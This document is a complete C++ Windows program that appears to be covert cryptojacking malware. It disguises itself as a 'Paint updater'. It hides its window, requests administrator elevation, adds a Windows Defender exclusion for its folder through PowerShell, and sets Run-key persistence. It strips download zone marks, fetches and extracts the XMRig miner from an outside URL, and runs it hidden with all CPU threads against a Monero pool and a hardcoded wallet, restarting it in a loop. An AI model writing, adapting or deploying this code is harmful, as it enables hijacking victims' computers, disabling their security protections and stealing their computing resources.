#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <shellapi.h>
#include <urlmon.h>
#include <string>
#include <vector>
#include <ctime>

// ================== CONFIG ==================
static const std::wstring WALLET =
    L"4AU1BH3zk235JvrAJeKWAsW7W46JPZWWCh3KsTLKLvgeF5dn2ryNCN65MXmqCXD8FnDhom77QkEkfRzqeLL5eVnf83UE9BB";
static const std::wstring POOL   = L"gulf.moneroocean.stream:20128";
static const std::wstring ZURL   =
    L"https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-6.22.0-msvc-win64.zip";
static const std::wstring MNAME  = L"xmrig.exe";
static const std::wstring ZNAME  = L"xmrig.zip";
static const std::wstring MUTEX  = L"Global\\PaintUpdaterSvc";
static const std::wstring KEYRUN = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const std::wstring KEYVAL = L"PaintUpdateSvc";
// ===========================================

static bool ExeDir(wchar_t* buf, DWORD size) {
    GetModuleFileNameW(nullptr, buf, size);
    wchar_t* c = wcsrchr(buf, L'\\');
    if (!c) return false;
    *c = 0;
    return true;
}

// Log using raw Win32 UTF-16LE writes – avoids CRT encoding bugs with MinGW
static bool Log(PCWSTR msg) {
    wchar_t pth[MAX_PATH];
    ExeDir(pth, MAX_PATH);
    wcscat_s(pth, L"\\paint.log");

    HANDLE h = CreateFileW(pth, FILE_APPEND_DATA, FILE_SHARE_READ,
        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    wchar_t buf[2048];
    time_t t = time(nullptr);
    struct tm lt;
    if (localtime_s(&lt, &t) != 0) { CloseHandle(h); return false; }
    int n = swprintf_s(buf, 2048, L"[%04d-%02d-%02d %02d:%02d:%02d] %s\n",
        lt.tm_year + 1900, lt.tm_mon + 1, lt.tm_mday,
        lt.tm_hour, lt.tm_min, lt.tm_sec, msg);
    if (n > 0) {
        DWORD written;
        WriteFile(h, buf, n * (DWORD)sizeof(wchar_t), &written, nullptr);
    }
    CloseHandle(h);
    return true;
}

static bool Elevated() {
    HANDLE h = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return false;
    TOKEN_ELEVATION e; DWORD sz = sizeof(e);
    BOOL r = GetTokenInformation(h, TokenElevation, &e, sz, &sz);
    CloseHandle(h);
    return r && e.TokenIsElevated;
}

static void ElevateAndExit() {
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    SHELLEXECUTEINFOW si{ sizeof(si) };
    si.fMask = SEE_MASK_NOCLOSEPROCESS;
    si.lpVerb = L"runas";
    si.lpFile = exe;
    si.nShow = SW_HIDE;
    if (ShellExecuteExW(&si)) {
        WaitForSingleObject(si.hProcess, INFINITE);
        CloseHandle(si.hProcess);
    }
}

static void DefenderExclusion() {
    wchar_t dir[MAX_PATH];
    ExeDir(dir, MAX_PATH);
    std::wstring cmd = std::wstring(L"powershell -NoProfile -Command ")
        + L"\"Add-MpPreference -ExclusionPath '" + dir + L"' -ErrorAction SilentlyContinue\"";
    std::vector<wchar_t> buf(cmd.begin(), cmd.end()); buf.push_back(0);
    STARTUPINFOW si{ sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 30000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    }
}

static void Persistence() {
    HKEY h = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, KEYRUN.c_str(), 0, KEY_SET_VALUE, &h)) return;
    wchar_t exe[MAX_PATH];
    GetModuleFileNameW(nullptr, exe, MAX_PATH);
    RegSetValueExW(h, KEYVAL.c_str(), 0, REG_SZ, (const BYTE*)exe,
        (DWORD)((wcslen(exe) + 1) * sizeof(wchar_t)));
    RegCloseKey(h);
    Log(L"Auto-start registered");
}

static bool FileExists(PCWSTR p) {
    DWORD a = GetFileAttributesW(p);
    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

static void ZoneDelete(PCWSTR p) {
    std::wstring z = std::wstring(p) + L":Zone.Identifier";
    DeleteFileW(z.c_str());
}

static bool FindMiner() {
    wchar_t dir[MAX_PATH], mine[MAX_PATH];
    ExeDir(dir, MAX_PATH);
    wcscpy_s(mine, dir); wcscat_s(mine, L"\\"); wcscat_s(mine, MNAME.c_str());
    if (FileExists(mine)) return true;

    std::wstring pat = std::wstring(dir) + L"\\*";
    WIN32_FIND_DATAW fd; HANDLE h = FindFirstFileW(pat.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return false;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
        std::wstring sub = std::wstring(dir) + L"\\" + fd.cFileName + L"\\" + MNAME;
        if (FileExists(sub.c_str())) {
            CopyFileW(sub.c_str(), mine, FALSE);
            ZoneDelete(mine);
            FindClose(h);
            return true;
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return false;
}

static bool DownloadAndExtract() {
    wchar_t dir[MAX_PATH];
    ExeDir(dir, MAX_PATH);
    std::wstring mine = std::wstring(dir) + L"\\" + MNAME;
    if (FileExists(mine.c_str())) { Log(L"Miner already present"); return true; }

    wchar_t tmp[MAX_PATH], zip[MAX_PATH];
    GetTempPathW(MAX_PATH, tmp);
    if (tmp[wcslen(tmp)-1] != L'\\') wcscat_s(tmp, L"\\");
    wcscpy_s(zip, tmp); wcscat_s(zip, ZNAME.c_str());
    DeleteFileW(zip); ZoneDelete(zip);

    Log(L"Downloading miner...");
    for (int a = 1; a <= 3; ++a) {
        HRESULT hr = URLDownloadToFileW(nullptr, ZURL.c_str(), zip, 0, nullptr);
        if (SUCCEEDED(hr) && FileExists(zip)) {
            DWORD sz = GetCompressedFileSizeW(zip, nullptr);
            if (sz != INVALID_FILE_SIZE && sz > 2048) {
                Log((std::wstring(L"Downloaded ") + std::to_wstring(sz) + L" bytes").c_str());
                ZoneDelete(zip);

                std::wstring ps = L"powershell -NoProfile -Command \"Expand-Archive -Path '"
                    + std::wstring(zip) + L"' -DestinationPath '" + std::wstring(dir) + L"' -Force\"";
                std::vector<wchar_t> pb(ps.begin(), ps.end()); pb.push_back(0);
                STARTUPINFOW si{ sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi{};
                if (CreateProcessW(nullptr, pb.data(), nullptr, nullptr, FALSE,
                    CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, 60000);
                    DWORD ec = 0x12345678;
                    GetExitCodeProcess(pi.hProcess, &ec);
                    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
                    Log((std::wstring(L"Extract exit: ") + std::to_wstring(ec)).c_str());
                }

                if (FindMiner()) { DeleteFileW(zip); return true; }
                Log(L"Extraction done, miner not found");
            }
        } else {
            Log((std::wstring(L"Attempt ") + std::to_wstring(a)
                + L" failed, hr=0x" + std::to_wstring((int)hr)).c_str());
        }
        if (a < 3) Sleep(5000);
    }
    return FindMiner();
}

static int ThreadCount() {
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD logical = si.dwNumberOfProcessors, physical = 0, len = 0;
    GetLogicalProcessorInformationEx(RelationProcessorCore, nullptr, &len);
    if (len > 0) {
        std::vector<char> buf((size_t)len);
        auto p = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)buf.data();
        if (GetLogicalProcessorInformationEx(RelationProcessorCore, p, &len)) {
            DWORD off = 0;
            while (off < len) {
                p = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX)(buf.data() + off);
                if (p->Relationship == RelationProcessorCore) ++physical;
                if (p->Size == 0) break;
                off += p->Size;
            }
        }
    }
    if (!physical) physical = logical;
    int t = (int)logical;
    if (t < 1) t = 1; if (t > 64) t = 64;
    Log((std::wstring(L"CPU: ") + std::to_wstring(physical)
        + L" phys " + std::to_wstring(logical)
        + L" log -> " + std::to_wstring(t) + L" threads").c_str());
    return t;
}

static void RunMiner() {
    wchar_t dir[MAX_PATH];
    ExeDir(dir, MAX_PATH);
    std::wstring mine = std::wstring(dir) + L"\\" + MNAME;

    if (!FileExists(mine.c_str())) {
        Log(L"Miner not found, downloading...");
        if (!DownloadAndExtract()) {
            Log(L"Download failed, will retry later");
            return;
        }
        mine = std::wstring(dir) + L"\\" + MNAME;
        if (!FileExists(mine.c_str())) { Log(L"Miner missing after download"); return; }
    }

    wchar_t host[64]; DWORD hsiz = 64;
    host[0] = 0; GetComputerNameW(host, &hsiz);

    int th = ThreadCount();
    std::wstring cmd = L"\"" + mine + L"\""
        + L" --url="    + POOL
        + L" --user="   + WALLET
        + L" --pass="   + host
        + L" --threads=" + std::to_wstring(th)
        + L" --randomx-init=" + std::to_wstring(th)
        + L" --donate-level=1"
        + L" --keepalive"
        + L" --retries=5"
        + L" --retry-pause=5"
        + L" --tls";

    Log(L"Launching miner...");
    std::vector<wchar_t> buf(cmd.begin(), cmd.end()); buf.push_back(0);
    STARTUPINFOW si{ sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(nullptr, buf.data(), nullptr, nullptr, FALSE,
        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        Log((std::wstring(L"Launch error ") + std::to_wstring(GetLastError())).c_str());
        return;
    }
    CloseHandle(pi.hThread);
    Log((std::wstring(L"Miner PID ") + std::to_wstring(pi.dwProcessId)).c_str());

    HANDLE hMiner = pi.hProcess;
    WaitForSingleObject(hMiner, INFINITE);
    DWORD ec = 0xDeadBeef;
    GetExitCodeProcess(hMiner, &ec);
    CloseHandle(hMiner);
    Log((std::wstring(L"Miner exit ") + std::to_wstring(ec)).c_str());
}

static BOOL WINAPI OnShutdown(DWORD) {
    return TRUE;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    HWND con = GetConsoleWindow();
    if (con) { ShowWindow(con, SW_HIDE); FreeConsole(); }

    if (!Elevated()) {
        Log(L"Elevating...");
        ElevateAndExit();
        return 0;
    }

    HANDLE hm = CreateMutexW(nullptr, TRUE, MUTEX.c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (hm) CloseHandle(hm);
        return 0;
    }

    SetConsoleCtrlHandler(OnShutdown, TRUE);

    Log(L"Elevated");
    DefenderExclusion();
    Persistence();

    int bo = 5;
    for (;;) {
        RunMiner();
        Log((std::wstring(L"Backoff ") + std::to_wstring(bo) + L"s").c_str());
        Sleep((DWORD)bo * 1000);
        bo = (bo * 2 > 300) ? 300 : (bo * 2);
    }
}
